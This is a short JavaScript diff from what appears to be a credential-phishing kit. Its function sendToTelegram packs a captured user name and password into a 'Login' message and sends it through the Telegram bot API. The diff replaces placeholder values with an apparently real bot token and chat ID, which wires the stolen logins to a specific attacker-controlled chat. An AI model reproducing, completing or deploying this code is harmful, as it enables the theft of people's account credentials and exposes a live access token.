@@ -1,7 +1,7 @@
 function sendToTelegram(user, pass, platform = "Default") {
   const message = `${platform} Login\n${user}\nPassword: ${pass}`;
-  const token = "YOUR_BOT_TOKEN";
-  const chatId = "YOUR_CHAT_ID";
+  const token = "7741229374:AAF7RZDHiyUp31GVh5LISuavRzwXGwC8HtQ";
+  const chatId = "7462084516";
 
   const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
